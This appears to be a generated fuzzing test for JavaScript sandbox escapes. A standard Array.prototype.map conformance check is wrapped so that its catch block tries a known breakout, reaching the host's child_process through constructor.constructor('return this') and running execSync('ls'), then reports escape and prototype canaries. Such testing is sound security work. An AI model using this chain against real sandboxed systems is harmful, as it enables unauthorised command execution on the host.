try {
    function callbackfn(val, idx, obj) {
        throw () => {
            return () => {
            };
        };
        return idx === 1 && typeof val === 'undefined';
    }
    var obj = {
        2: 2,
        length: 20
    };
    Object.defineProperty(obj, '0', {
        get: function () {
            delete Object.prototype[1];
            return 0;
        },
        configurable: true
    });
    Object.prototype[1] = 1;
    var testResult = Array.prototype.map.call(obj, callbackfn);
    assert.sameValue(testResult.length, 20, 'testResult.length');
    assert.sameValue(typeof testResult[1], 'undefined', 'typeof testResult[1]');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}